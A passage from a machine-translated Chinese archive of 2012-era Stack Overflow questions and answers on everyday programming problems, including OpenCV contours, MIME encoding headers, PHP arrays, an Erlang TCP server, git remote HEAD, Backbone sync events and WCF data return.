cv::cvtColor(roMat, oToShow, CV_GRAY2BGR);

cv::threshold(roMat, oResult, 127, 255, 0);
std::vector<std::vector<cv::Point>> contours;
std::vector<cv::Vec4i> hierarchy;

cv::findContours( oResult, contours, hierarchy, CV_RETR_LIST, CV_CHAIN_APPROX_SIMPLE );

std::vector<std::vector<cv::Point> > oHull(contours.size());
for( int i = 0; i != contours.size(); i++)
{
    if( cv::contourArea(contours[i]) > 5000 )
    {
        cv::convexHull(contours[i], oHull[i]);
        cv::approxPolyDP(oHull[i], oHull[i], 0.1*cv::arcLength(oHull[i], true), true);
        if( oHull[i].size() == 4 )
        {
            cv::drawContours(oToShow, oHull, -1, cv::Scalar(0, 255,0), 2, 8);
        }

    }
}

cv::imshow("hull", oToShow);
cv::waitKey(0); 
```

我认为错误在于，您实际上得到了**一系列**船体，而不仅仅是一个船体。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-24T00:13:14.253

我在您的代码中没有看到 imread，所以我假设您正在读取此函数之外的图像并将其传入。您是否尝试在读取后立即执行 imshow 以确保正确加载图像。

第一行向我表明这可能是问题所在。

# jdeveloper - jdeveloper：版本控制工具 - xml-source-compare

> ID：13599699
> 
> 赞同：0
> 
> 时间：2012-11-28T07:11:27.913
> 
> 标签：jdeveloper

我在 jdeveloper 中使用版本控制工具。在提交文件之前，我正在检查文件历史记录中的更改-> xml-source-compare。由于某种原因，我不习惯显示差异，这对我来说还不够清楚。我一直使用“比较它”软件。我想知道是否有任何方法可以定义 xml-source-compare 将使用“比较它”软件而不是现有软件。

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-29T17:54:15.937

不，您不能更改使用的工具。但是，您可以使用外部 SVN 工具（或您使用的任何源代码控制）并将其设置为使用您的合并工具。

# html - 徽标图像不显示

> ID：13599700
> 
> 赞同：0
> 
> 时间：2012-11-28T07:11:30.880
> 
> 标签：html, css, firefox

我有两个名为 a.html 和 b.html 的 html，文件 achive[在这里](http://www.filehub.org/files/download/6785/test-menu.tar.gz)，徽标图像的 css 在这里：

```
.mylogo{
float:left;
position:relative;
padding:9px 0 0 0;
zoom:1;  /* some effect*/
}

.mylogo img{
position:absolute;
top:10px; /* distance between parent element*/
left:0;}   /* set margin*/

.gets-logo-4x{float:left;} 
```

在 b.html 中添加一些 css 文件（对于其他省略的元素）后，b.html 的徽标图像无法在 firefox 中显示（在 chrome 中工作）。如何只修改 mystyle.css 以使其工作？任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T08:03:36.763

问题是，在您的文件 a.html 中，您没有包含“bootstrap.min.css”。b.html 页面上的类 .container 已经被具有相同类名“.container”的引导程序样式采用。所以去改变你的类名，或者你可以添加一个新的特定样式，例如：#header .container

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T08:57:03.273

在你的 bootstrap.min.css 第 10 行

```
img{max-width:100%;vertical-align:middle;border:0;-ms-interpolation-mode:bicubic;} 
```

把它改成

```
img{vertical-align:middle;border:0;-ms-interpolation-mode:bicubic;} 
```

即删除最大宽度

# objective-c - iOS NSMutableData *data = [[NSMutableData alloc] init]; 崩溃

> ID：13599706
> 
> 赞同：3
> 
> 时间：2012-11-28T07:11:56.570
> 
> 标签：objective-c, ios

我在函数中使用下面提到的行

```
NSMutableData *data = [[NSMutableData alloc] init]; 
```

我将这个函数称为没有时间（例如 100 次）。所以我的问题是，最初大约 60 次或更多它工作正常，但之后它给了我“BAD_EXC_ACCESS”

功能如下

```
+ (NSString *) recvToFile:(NSString *)_fileName {

@try {
    int _sz = [self recvNumber:4];
    uint8_t t[_sz];
    NSMutableData *data = [[NSMutableData alloc] init];
    NSMutableData *fileData = [[NSMutableData alloc] init];
        long _pos = 0;
        NSString *_fullPath = _fileName;
        while (_sz > _pos) {
            long _c = [m_sin read:t maxLength:_sz];
            _pos += _c;
            data = [NSData dataWithBytes:t length:_c];
            if([Misc checkFileExists:_fileName]==nil)
                [[NSFileManager defaultManager] createFileAtPath:_fullPath contents:nil attributes:nil];
            [fileData appendData:data];
        }
    [fileData writeToFile:_fullPath atomically:YES];
    NSDictionary *attr = [[NSFileManager defaultManager] attributesOfItemAtPath:_fullPath error:nil];

    long long length = [[attr valueForKey:@"NSFileSize"] intValue];
    if (length >= _sz)
        return (_fullPath);
}
@catch (NSException * e) {
}
return (nil);
} 
```

每次收到文件时，我都会调用此函数。我想从字节中保存文件

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:38:09.407

尝试将这样的数据添加到 nsmutabledata

```
 [data appendBytes:t length:_c]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:27:43.767

您不应该在这里初始化数据：

```
NSMutableData *data = [[NSMutableData alloc] init]; 
```

只需将变量初始化为零；

```
NSMutableData* data = nil; 
```

# email - 多部分/替代内容类型是否需要内容传输编码？

> ID：13599707
> 
> 赞同：4
> 
> 时间：2012-11-28T07:11:56.637
> 
> 标签：email, smtp, sendmail, content-type, postfix-mta

我有一个发送电子邮件的应用程序，几个月来，它运行良好。我最近遇到了`utf-8`发送到 iPhone 的编码电子邮件问题`Exchange account`（即不是`IMAP`）。
接收者只需要看到一大堆无意义的字符，例如`LS0tLS0tPV9QYXJ0XzE0N18[....]`.

将我的电子邮件标题与 Gmail 进行比较，我注意到我有一个额外`Content-Transfer-Encoding`的与`Content-Type: multipart/alternative;`.
我的电子邮件看起来像

```
Delivered-To: ...
Received: ...
...
MIME-Version: ...
Content-Type: multipart/alternative; 
    boundary="----=_boundary" 
Content-Transfer-Encoding: Base64  # <= the extra setting

----=_boundary
Content-type: text/plain; charset=utf-8
Content-Transfer-Encoding: Base64

YmVu0Cg==

----=_boundary
Content-type: text/html; charset=utf-8
Content-Transfer-Encoding: Base64

PGh0bWwgeG1sbnM6bz0iIj48aGVhZD48dGl0bGU+PC90aXRsZT48L2hlYWQ+PGJvZHk+YmVub2l0
PC9ib2R5PjwvaHRtbD4NCjx9IjAiIC8+Cg==

----=_boundary 
```

如果我删除额外的设置，我的电子邮件会被接收并正确显示。

我的问题：

1.  即使对于特定情况，`Encoding`基本上也需要设置？`Content-Type: multipart/alternative;`
2.  删除它并像以前一样继续使用我的应用程序是否安全？

**编辑** 我发现[`IETF`](https://www.rfc-editor.org/rfc/rfc2387#section-2)：

> 编码注意事项：多部分内容类型不能有编码。

但我也发现[`Wikipedia`](http://en.wikipedia.org/wiki/MIME#Multipart_messages)：

> 多部分类型的内容传输编码必须始终为“7 位”、“8 位”或“二进制”，以避免多级解码带来的复杂性。

是不是很矛盾？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-28T07:59:57.070

IETF 和维基百科的陈述并不矛盾。`7bit`, `8bit`, 或者`binary`不是真正的内容编码，因为它们没有指定内容的任何转换。他们只是声明内容尚未编码。在这种情况下，`7bit`它还指定不需要对内容进行编码，即使消息需要通过非 8 位干净的传输方式发送也是如此。

只有最底层的消息应该有一个实际的`Content-Transfer-Encoding`，例如`base64`or `quoted-printable`。在您从外部引用的消息中肯定不是 base64 编码的，因此声明它不仅违反标准而且不正确。这肯定会导致显示该消息的问题。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-28T07:44:54.890

实际上，multipart 的每个部分都有自己的编码，为 multipart 容器声明一个是没有意义的。无论如何，我无法理解维基百科的引用；无论如何，它几乎没有权威性。

# php - 如何检查搜索的最大值？

> ID：13599716
> 
> 赞同：0
> 
> 时间：2012-11-28T07:12:37.353
> 
> 标签：php, arrays, math

如果我有这样的数据：

```
$data1 = array(40, 'P1');
$data2 = array(70, 'P3');
$data3 = array(35, 'P2');
$data4 = array(55, 'P3');
$data5 = array(25, 'P1'); 
```

怎么能找到50多条数据？例如：

70>50；

55>50；

请帮帮我

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:35:34.660

您可以使用函数[array_filter](http://www.php.net/manual/en/function.array-filter.php)，因此在 php 5.3 中的代码将如下所示：

```
$data1 = array(40, 'P1');
$data2 = array(70, 'P3');
$data3 = array(35, 'P2');
$data4 = array(55, 'P3');
$data5 = array(25, 'P1');

$data = array($data1, $data2, $data3, $data4, $data5);
$result = array_filter($data, function($_item) {
    return $_item[0] > 50;
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:18:35.340

这是你要找的东西吗？

```
//set your array into 2 dimentional array
$data=array();
array_push($data,$data1,$data2,$data3,$data4,$data5);

//get the data
foreach($data as $datum){
    if ($datum[0]>50) echo $datum[1].'<br />';
} 
```

# erlang - 二郎：TCP服务器

> ID：13599717
> 
> 赞同：3
> 
> 时间：2012-11-28T07:12:40.880
> 
> 标签：erlang, erlang-shell, erlang-ports

嗨，我是 Erlang 中的一只新蜜蜂，但设​​法创建了一个简单的 TCP 服务器，它以被动模式接受客户端并显示消息。每次新客户端连接到服务器时，我都会生成一个新进程。有没有一种方法可以使用客户端连接时产生的进程向客户端发送消息。

这是代码。

```
-module(test).

-export([startserver/0]).

startserver()->
{ok, ListenSocket}=gen_tcp:listen(1235,[binary,{active, false}]),
connect(ListenSocket).

connect(ListenSocket)->
{ok, UserSocket}=gen_tcp:accept(ListenSocket),
Pid=spawn(? MODULE, user,[UserSocket]),
gen_tcp:controlling_process(UserSocket, Pid),
connect(ListenSocket).

user(UserSocket)->
case gen_tcp:recv(UserSocket, 0) of.
{ok, Binary}->% Send basic message.

{error, closed}->% operation on close. 
end. 
```

如果我做的话，我可以有一些事情吗？

`Pid!{"Some Message"}`. 并且消息被发送到与具有非阻塞io的进程关联的套接字，

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T09:48:19.157

您可以尝试使用 OTP 原理编写 TCP 服务器的本教程：http: [//learnyousomeerlang.com/buckets-of-sockets#sockserv-revisited](http://learnyousomeerlang.com/buckets-of-sockets#sockserv-revisited)

如果您使用 gen_server 而不是连接循环，则可以将 Pid 存储在状态中。然后您可以使用 gen_server:cast/2 向其中一个 Pid 发送消息。

您想从控制进程向客户端发送消息的函数是 gen_tcp:send(Socket, Message)，因此例如，如果您想在连接时发送一次性消息，您可以这样做：

```
user(UserSocket)->
gen_tcp:send(UserSocket, "hello"),
case gen_tcp:recv(UserSocket, 0) of
   {ok, Binary}->% Send basic message.
        gen_tcp:send(UserSocket, "basic message"),
   {error, closed}->% operation on close. 
        gen_tcp:send(UserSocket, "this socket is closing now"),
end. 
```

# java - 通过控制台传递数组的元素来查找数字的平均值

> ID：13599721
> 
> 赞同：2
> 
> 时间：2012-11-28T07:13:03.000
> 
> 标签：java, arrays, parameters, console

实际上我是这个小组的新手，也是 Java 的新手，我想知道如何通过控制台传递数组参数，我最终编程如下：

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
class Average
  {
    public static void main(String []args)
    {
      int numbers[];

      try
       {
      BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
      numbers =Integer.parseInt( br.readLine());
       }
      catch(NumberFormatException ne)
            {
                    System.out.println("Invalid input: " + ne);
                    System.exit(0);
            }
            catch(IOException ioe)
            {
                    System.out.println("I/O Error: " + ioe);
                    System.exit(0);
            }
        System.out.println(methodAverage());
            }

        public static int methodAverage(int...numbers)
        {
         int sum=0;
         int avg=0;

         for(int x:numbers)
         {
          sum+=x;
          avg=sum/numbers.length;
          return avg;
          }
          }
          } 
```

错误是

```
Average.java:13: error: incompatible types
numbers =Integer.parseInt( br.readLine());
         ^
required: int[]
found:    int
  1 error 
```

我知道那会来，但我只是试过
所以我只想知道如何通过控制台传递这些数字？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T07:19:01.407

> 整数[]；

由于数组是一个对象，您需要使用`new`as 在堆上分配它`int numbers[] = new int[size];`。

> Average.java:13：错误：不兼容的类型
> 数 =Integer.parseInt(br.readLine());

--> Integer.parseInt() 返回整数而不是数组，您可以使用：

```
for(int index=0; index<size; index++) {
    numbers[index] =Integer.parseInt( br.readLine()); // add exception handling code as above
} 
```

您正在使用`BufferedReader br = new BufferedReader(new InputStreamReader(System.in));`从控制台读取值，而不是我建议您使用 Scanner 类。看看[java.util.Scanner](http://docs.oracle.com/javase/7/docs/api/java/util/Scanner.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:16:30.183

如果您使用它来运行该应用程序，这就是您在命令行或终端中传递值数组的方式，这应该足够了

```
java SomeJavaFile.java 1,2,3,4,5 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T07:16:28.627

```
numbers = Integer.parseInt(br.readLine()); 
```

`parserInt()`返回一个整数，并且`numbers`是一个数组。你需要一个循环。

至于您的`average()`方法，您可能需要考虑使用浮点数学。否则，平均值`1 1 1 1 1 1 0`将为零。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T07:18:22.250

使用`ArrayList<Integer> numbers = new ArrayList<Integer>`代替`int[] numbers`；并更改 `numbers =Integer.parseInt( br.readLine());` 为`numbers.add(Integer.parseInt( br.readLine()));` 这允许您读取每个输入行的单个整数。

如果您有一行包含多个整数作为输入：

```
String[] nums = br.readLine().split(" ");
int[] numbers = new int[nums.length];
for(int i = 0; i < nums.length; i++) {
 numbers[i] = Integer.parseInt(nums[i]);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-28T07:29:30.787

```
Please find the modified program to get the average.
I have used space as a separator when user enters the inputs.

package Test;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
class Average
  {
    public static void main(String []args)
    {
     // int numbers;
      BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
      String ip = null;
    try {
        ip = br.readLine();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
      String[] items=ip.split(" ");
      int[] results = new int[items.length];
      try
       {

      for (int i = 0; i < items.length; i++) {
          try {
              results[i] = Integer.parseInt(items[i]);
          } catch (NumberFormatException nfe) {};
      }
       }
      catch(NumberFormatException ne)
            {
                    System.out.println("Invalid input: " + ne);
                    System.exit(0);
            }
        System.out.println(methodAverage(results));
            }

        public static int methodAverage(int...numbers)
        {
         int sum=0;
         int avg=0;

         for(int x:numbers)
         {
          sum+=x;
          avg=sum/numbers.length;
          }
        return avg;
          }
          } 
```

# python - 为什么 Sublime API 中没有“sys.argv”？

> ID：13599724
> 
> 赞同：5
> 
> 时间：2012-11-28T07:13:19.087
> 
> 标签：python, sublimetext2

这个问题已经在 Sublime 论坛上[问](http://www.sublimetext.com/forum/viewtopic.php?f=6&t=8943)过了，但似乎没有人能回答。也许你可以？

我在 Windows 7 和 8，Sublime 2.0.1 x86 版本上遇到了同样的问题：

```
Traceback (most recent call last):
File "./sublime_plugin.py", line 362, in run_
File "./myTestPlugin.py", line 8, in run
AttributeError: 'module' object has no attribute 'argv' 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T07:14:21.257

因为 sublime 插件*不是*脚本。没有命令行，因此没有要解析的命令行参数。

在 Sublime 中，Python 是嵌入式的，并且要`sys.argv`设置嵌入式 python 代码，Sublime 必须显式设置参数。请参阅[嵌入 Python 简介](http://docs.python.org/2/c-api/intro.html#embedding-python)。

如果您对此有强烈的感觉，则必须向 Sublime Text 2 开发人员提出案例，以便[`PySys_SetArgvEx(argc, argv, updatepath)`](http://docs.python.org/2/c-api/init.html#PySys_SetArgvEx)在[`Py_Initialize()`](http://docs.python.org/2/c-api/init.html#Py_Initialize).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-26T06:13:27.130

使用包控制

1.  通过 Package Control 安装这个 sublime text 2/3 包；
2.  搜索包：`"InputArgs"` 或，

操作系统：

```
$ cd ~/Library/Application\ Support/Sublime\ Text\ <2/3>/Packages/
$ git clone git://github.com/bilalba/InputArgs.git InputArgs 
```

Linux（类似 Ubuntu 的发行版）：

```
$ cd ~/.config/sublime-text-<2/3>/Packages/
$ git clone git://github.com/bilalba/InputArgs.git InputArgs 
```

视窗：

将目录复制到：

```
"C:\Users\<username>\AppData\Roaming\Sublime Text <2/3>\Packages" 
```

# git - gitlab 没有遥控器/来源/HEAD

> ID：13599727
> 
> 赞同：5
> 
> 时间：2012-11-28T07:13:31.630
> 
> 标签：git, gitlab

我对 git 很陌生，但我一直在我设置的远程服务器上使用它，我很确定我了解基础知识。

我刚刚设置了 gitlab 并将我的一些代码推送到了一个新项目。我所做的是：

1.  在目录中获取我的所有代码
2.  混帐初始化
3.  混帐添加。
4.  git commit -m "初始提交"
5.  git push 起源大师

原点设置的位置：

```
git remote add origin git@1.2.3.4:myproject.git 
```

现在当我做 git branch -a 我看到：

```
* master
  remotes/origin/master 
```

而当我以前玩的时候，我总是看到：

```
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/master 
```

我知道 head 是当前签出分支的指针，所以它不应该存在于原点上吗？为什么没有创建？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-28T07:53:05.597

不用太担心这个遥控器`HEAD`。这条线只是原始克隆工作方式的产物，代表远程的状态`HEAD`。

它可以被视为服务器首选的默认分支（即使在远程裸存储库上） - 如果未使用选项`git clone`，默认情况下它将由您的客户端检出。`-b branch`

您的本地文件现在`.git/refs/remotes/origin/HEAD`可能包含字符串`ref: refs/remotes/origin/master`。您可以根据需要删除它（我不建议这样做，请注意），并且`git branch -a`不会再显示它。

除了将远程`HEAD`用作第一次克隆的默认分支之外，对您而言，远程状态`HEAD`无关紧要。您应该只担心真正的远程分支的状态，而不是远程`HEAD`，因为它只对远程状态作为其默认选择的分支有意义。如果远程是裸存储库，即使在远程也没有多大意义。

`git remote add ...`当你看到远程 HEAD 时，你没有看到远程 HEAD 的原因是因为在这种情况下`git fetch`，`git pull`git 不必决定默认选择哪个默认远程分支。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2018-08-28T16:06:03.890

您可以通过 command 设置它`git remote set-head origin -a`，它会自动将 origin/HEAD 设置为指向适当的远程分支。或者`git remote set-head origin <branch>`用来指定一个远程分支指向。

另见：[https ://stackoverflow.com/a/8841024/1851492](https://stackoverflow.com/a/8841024/1851492)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-10-04T04:25:06.467

我以这种方式解决我的问题

1.  首先删除文件夹中的索引文件`.git`。
2.  然后打开终端并输入`git reset`

# php - 什么在php中实现计数器

> ID：13599729
> 
> 赞同：2
> 
> 时间：2012-11-28T07:13:35.983
> 
> 标签：php, cakephp-1.3

我想显示计数器。我正在写一个我们正在更新数据库记录的地方。

我在这里打印计数器值——

```
 flush();
            echo "<hr><div align=\"center\">";
            echo 'loading ..... '.$counter; //echo "</br>";
            echo "</div>";
            $counter++; 
```

但它再次在下一行打印值..

![在此处输入图像描述](../Images/06fd3c708ecf2df5c6185a42e0a0b5a7.png)

但我希望像这样更新值
![在此处输入图像描述](../Images/d6909fc78576054b7a397d6aa715dd2a.png)

这个会一直改的。。

帮助我或指导我..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T07:23:51.063

您在这里所做的是*生成*HTML；一旦它被写入，就没有“收回它”。

为了让您的计数器“更新”，您将需要执行所谓的文档对象模型操作（DOM 实际上是您网站的所有组成部分，当然包括所有 HTML 标记）。这通常使用 JavaScript 完成，而 jQuery 可以进一步简化任务。

此外，您的数据库插入将发生得如此之快（在几分之一秒内），以至于没有理由在您的用户之前“实时”显示更新的计数器。

如果您真的坚持在执行 PHP 时动态更新站点上的信息，则需要研究 AJAX。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:34:17.647

您必须使用 Javascript 才能做到这一点。你可以使用类似的东西：

```
 flush();
    echo "<hr><div align=\"center\">";
    echo 'loading ..... '. '<span class = "toDecr">' . $counter . '</span>';
    echo "</div>";
    $counter++; 
```

然后使用 jQuery 创建一个脚本（jQuery 不是强制性的，你可以用原始的 Javascript 来做，但是 jQuery 绝对更容易恕我直言）：

```
 $('.toDecr').html(parseInt($('.toDecr').html(), 10) - 1) 
```

我不知道你想在递减之间等待的延迟，所以我把它留空（如果你想每秒都这样做，那么只需使用一个循环，或者它真的取决于你的 PHP、Ajax 的执行是要走的路）。

# php - 如何从mysql对php循环中的项目求和

> ID：13599738
> 
> 赞同：-4
> 
> 时间：2012-11-28T07:14:13.983
> 
> 标签：php, mysql

```
<?php
    $query2 = QModel::query("SELECT * FROM transaction");
    while($get2 = QModel::g($query2)) {
        $totalprice = $get2['price'];
        echo array_sum($totalprice);
    }
?> 
```

我得到 php 错误：

消息：array_sum() 期望参数 1 是数组，给定字符串

请帮忙谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:17:28.080

你可以这样使用：

```
$totalprice += $get1['price']; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:17:44.553

```
while($get2==Qmodel::query("select * from transaction"))
{
    $totalprice[]=$get2['price'];
}
echo array_sum($totalprice); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T07:17:55.893

```
while(..)
{
    $totalpirce += $get2['price'];
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T07:18:00.733

干得好：

```
<?php
$query2 = QModel::query('SELECT FROM transaction');
while($get2 = QModel::q($query2)){
  $sum += $get2['price'];
}
echo $sum;
?> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-28T07:19:50.440

为什么不使用`SELECT transaction.*, SUM(price) as total_price FROM transaction`？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-28T07:20:01.447

`$totalprice=$get2['price];`=>定义数组的方法不正确 `$totalprice[]=$get2['price];`=>定义数组的正确方法

```
$totalprice=array();
$query="";
while(condition){
      $totalprice[]=$get2['price];
}echo array_sum($totalprice); 
```

# php - 如何在社区构建器专业版中获取当前登录的用户 ID

> ID：13599740
> 
> 赞同：1
> 
> 时间：2012-11-28T07:14:18.480
> 
> 标签：php, joomla, joomla-extensions

我想在社区构建器专业插件中获取当前登录的用户 ID 我使用了这段代码，但它对我不起作用

```
 $user=&JFactory::getUser();
   $user->id; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:56:01.313

试试下面的代码。这是一种替代方法。

```
$user =& JFactory::getUser();
$userId = $user->get( 'id' ); 
```

[阅读更多。](http://docs.joomla.org/Accessing_the_current_user_object)

# objective-c - 无法从 xcode 中的 json 读取 utf8 字符

> ID：13599741
> 
> 赞同：0
> 
> 时间：2012-11-28T07:14:20.043
> 
> 标签：objective-c, xcode, json, utf-8

当我的 json 文件中有英文字符时，它会在数组中打印读取的 json，但是当我有藏文字符（utf8）时，它会打印 null。我正在粘贴我的 json 和 xcode 代码。请帮忙。这段代码是我从[核心数据教程中尝试的](http://www.raywenderlich.com/12170/core-data-tutorial-how-to-preloadimport-existing-data-updated)

```
 int main(int argc, const char * argv[])
    {

        @autoreleasepool {
            // Create the managed object context
            NSManagedObjectContext *context = managedObjectContext();

            // Custom code here...
            // Save the managed object context
            NSError *error = nil;
            if (![context save:&error]) {
                NSLog(@"Error while saving %@", ([error localizedDescription] != nil) ? [error localizedDescription] : @"Unknown Error");
                exit(1);
            }
            NSError* err = nil;
            NSString* dataPath = [[NSBundle mainBundle] pathForResource:@"tsikzoe" ofType:@"json"];

            NSDictionary* tsikzoe = [NSJSONSerialization JSONObjectWithData:[NSData dataWithContentsOfFile:dataPath]options:kNilOptions error:&err];
 NSLog(@"Imported tsikzoe: %@",[tsikzoe objectForKey:@"wordDef"]);

        }
        return 0;
    } 
```

这是JSON

```
[{"id":1,"dictionaryType":1,"word":"༼༡༠༠༦༽ སྲོང་བཙན་ཆོས་ཀྱི་རྗེ་བོ་ཡབ་ཡུམ་གསུམ།","wordDef":"རྒྱལ་པོ་སྲུང་བཙན་སྒམ་པོ། བལ་བཟའ་ཁྲི་བཙུན། རྒྱ་བཟའ་ཀོང་ཇོ་བཅས་གསུམ་ལ་ཟེར།","dateSubmitted":"2012-08-19 00:00:00","author":2,"authorName":"དུང་དཀར་ཚིག་མཛོད།"},
  {"id":2,"dictionaryType":1,"word":"༼༡༠༤༠༽ བསོ།","wordDef":"བསོ་བསོ་ཞེས་པའི་སྒྲའི་ཁྱད་པར་གྱི་མིང༌།","dateSubmitted":"2012-08-19 00:00:00","author":2,"authorName":"དུང་དཀར་ཚིག་མཛོད།"}] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:25:19.607

```
 NSDictionary* tsikzoe = [NSJSONSerialization JSONObjectWithData:[NSData dataWithContentsOfFile:dataPath]options:kNilOptions error:&err]; 
```

在这种情况下，您的 JASON 是一个数组，因此您需要访问该数组中的两个元素之一，这将是一个字典。

字典 JSON 将具有这种格式

```
{
"employees": [    //right here! 
{ "firstName":"John" , "lastName":"Doe" }, 
{ "firstName":"Anna" , "lastName":"Smith" }, 
{ "firstName":"Peter" , "lastName":"Jones" }
]
} 
```

数组 JSON 将具有这种格式

```
{
[    //notice the difference. 
{ "firstName":"John" , "lastName":"Doe" }, 
{ "firstName":"Anna" , "lastName":"Smith" }, 
{ "firstName":"Peter" , "lastName":"Jones" }
]
} 
```

# javascript - Backbone：如何在不获取整个集合的情况下更新 isNew 的模型？

> ID：13599744
> 
> 赞同：1
> 
> 时间：2012-11-28T07:14:22.753
> 
> 标签：javascript, backbone.js

我有一个表格`create`作为集合的模型。`add`这会向集合触发一个事件。我将它绑定到一个方法：

```
this.collection.bind('add', this.addOne, this) 
```

火灾...

```
addOne: function(tenant) {
   var self = this
   var collection = this.collection

   var view = new TenantView({model: tenant,collection:collection});
   self.$el.append(view.render().el);
} 
```

将其`create`同步到数据库，但新的附加视图仍然`isNew`是主干，因为它没有获取集合并获取新模型的 id。

我的问题是，如何在`isNew`不获取整个集合**然后**附加它的情况下从服务器（具有 id 而不是）获取同步模型？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T07:18:28.460

使用`sync`事件而不是`add`...

```
this.collection.bind('sync', this.addOne, this); 
```

调用时*立即*`add`触发事件；但是[一旦服务器响应了 create 方法就会被触发，因此它应该包含正确的模型 id](http://backbonejs.org/#Collection-create)。*`create`[`sync`](http://backbonejs.org/#Collection-create)*

 *您还可以等待服务器的响应，然后再将模型添加到集合中——使用`wait: true`in`create`的 options hash: 来做到这一点`collection.create({ ... }, { wait: true })`。

> 一旦在服务器上成功创建模型，创建模型将立即触发集合上的“添加”事件以及“同步”事件。如果您想在将新模型添加到集合之前等待服务器，请传递 {wait: true}。*

# iphone - 在 iPhone 中使用 FMOD 为音频添加效果并保存新音频

> ID：13599747
> 
> 赞同：1
> 
> 时间：2012-11-28T07:14:44.340
> 
> 标签：iphone, ios, ipad, audio, fmod

我正在使用 FMOD 在音频文件中添加效果，并将带有效果的音频保存到文档目录中。我面临的问题是，如果音频停止，FMOD 会继续将数据写入文件。如果音频已经完成，我应该用什么来停止 FMOD 写入数据？下面是我的代码...

```
- (void)startFMODToAddEffects
{
FMOD_RESULT result = FMOD_OK;

unsigned int  version       = 0;

/*
 Create a System object and initialize
 */
result = FMOD::System_Create(&system);
ERRCHECK(result);

result = system->getVersion(&version);
ERRCHECK(result);

if (version < FMOD_VERSION)
{
    fprintf(stderr, "You are using an old version of FMOD %08x.  This program requires %08x\n", version, FMOD_VERSION);
    exit(-1);
}

char buffer[200] = {0};
NSString *tFileName=[NSString stringWithFormat:@"%@/Part2.m4a", [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0]];
[tFileName getCString:buffer maxLength:200 encoding:NSASCIIStringEncoding];

char cDest[200] = {0};
NSString *fileName=[NSString stringWithFormat:@"%@/Part2WithEffect.wav", [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0]];
[fileName getCString:cDest maxLength:200 encoding:NSASCIIStringEncoding];

result = system->setOutput(FMOD_OUTPUTTYPE_WAVWRITER);
ERRCHECK(result);

result = system->init(32, FMOD_INIT_NORMAL | FMOD_INIT_ENABLE_PROFILE, cDest);
ERRCHECK(result);

result = system->createStream(buffer, FMOD_SOFTWARE, NULL, &sound);
ERRCHECK(result);

result = system->playSound(FMOD_CHANNEL_FREE, sound, false, &channel);
ERRCHECK(result);

result = system->createDSPByType(FMOD_DSP_TYPE_LOWPASS, &dsplowpass);
ERRCHECK(result);

result = system->addDSP(dsplowpass, NULL);
ERRCHECK(result);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T10:53:10.567

只需调用你停止播放的方法

> //System::release
> system -> release();

它应该停止在您的文件中写入数据。

# wcf - 如何从 WCF 返回数据库记录

> ID：13599750
> 
> 赞同：-3
> 
> 时间：2012-11-28T07:14:56.747
> 
> 标签：wcf, return

我创建了 WCF 服务，我想将数据库记录从 WCF 服务返回给客户端。

我的客户端应用程序检索显示在网页中的记录。客户开发他们的应用程序任何平台，如 PHP 或 JAVA 或 .NET。他们使用我的 WCF 服务来获取详细信息。

如何使用 XML 或任何其他方法将数据从 WCF 服务返回到客户端应用程序？

请对此提出建议/代码片段以解决我的疑问。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:20:19.690

如果您将 WCF 部署为`basicHttpBinding`将您的 WCF 服务公开为旧版 ASMX Web 服务，以便旧客户端可以使用新服务并使用 SOAP 协议（​​基于 XML）公开您的数据。`wsHttpBinding`你也可以用（更高级）做类似的事情。我建议使用基本的，因为您将从 PHP、Java 和 NET 中使用它。选择更简单的可能对你有用。

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <system.serviceModel>
        <bindings>
            <!—- Default binding for basicHttpBinding -->
            <basicHttpBinding>
                <binding name="myBindingConfiguration1" closeTimeout="00:01:00" />
